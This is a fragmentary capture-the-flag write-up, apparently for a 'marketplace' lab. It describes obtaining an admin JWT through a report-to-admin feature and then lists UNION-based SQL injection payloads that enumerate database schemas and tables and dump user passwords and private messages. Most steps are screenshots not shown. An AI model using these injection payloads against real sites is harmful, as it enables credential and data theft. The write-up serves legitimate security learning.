...
![unnamed_0031f48e5da040ed81d1107f8f0ccf92](unnamed_0031f48e5da040ed81d1107f8f0ccf92.png)
...
![unnamed_544cb2bd48a24543908f29176f7c519b](unnamed_544cb2bd48a24543908f29176f7c519b.png)

And we get the token!
but this is only our token. This doesn't help us
![unnamed_9583e341c5f441c9bcb785288852c246](unnamed_9583e341c5f441c9bcb785288852c246.png)
However when I report it to admin, we get a JWT back 
![unnamed_38c5764ab5fb42dfb9fc8d5d5893d037](unnamed_38c5764ab5fb42dfb9fc8d5d5893d037.png)
...
```
![unnamed_23ae085f9fc0434193903a77316751a0](unnamed_23ae085f9fc0434193903a77316751a0.png)
...
![unnamed_e0147ef425e54e5595d1efa3766da37c](unnamed_e0147ef425e54e5595d1efa3766da37c.png)

Lookie lookie! :)
![unnamed_4d4107a7da1841cea7262df171e660a3](unnamed_4d4107a7da1841cea7262df171e660a3.png)
...
```
![unnamed_3eab26391bd248bea53c17a84b363d00](unnamed_3eab26391bd248bea53c17a84b363d00.png)

```
?user=-3 union select NULL, group_concat(SCHEMA_NAME), NULL, NULL from INFORMATION_SCHEMA.schemata--
```
![unnamed_bb42259c91f84b50bd1d351df465757f](unnamed_bb42259c91f84b50bd1d351df465757f.png)

```
?user=-3 union select NULL, group_concat(table_name), NULL, NULL from INFORMATION_SCHEMA.tables where table_schema='marketplace'--```
```
![unnamed_ea625274497543f5b5f91cf5f1de5055](unnamed_ea625274497543f5b5f91cf5f1de5055.png)
...
![unnamed_c1a5d5481e464c62b4309e57c4bdc43a](unnamed_c1a5d5481e464c62b4309e57c4bdc43a.png)

```
?user=-3 union select NULL, group_concat(password), NULL, NULL from marketplace.users--
```
![unnamed_570b856411c64bea89dfb346174d11be](unnamed_570b856411c64bea89dfb346174d11be.png)
...
![unnamed_549452a867c94c1eb93426f205a55a06](unnamed_549452a867c94c1eb93426f205a55a06.png)
```
?user=-3 union select NULL, group_concat(user_from, 'UWU', user_to, 'UWU', message_content), NULL, NULL from marketplace.messages--
```
![unnamed_a50782b512b14846b6af1207c257260b](unnamed_a50782b512b14846b6af1207c257260b.png)
...
@b_ENXkGYUCAv3zJ
```
![unnamed_f1a25b50779a477c9551ed526323fdd2](unnamed_f1a25b50779a477c9551ed526323fdd2.png)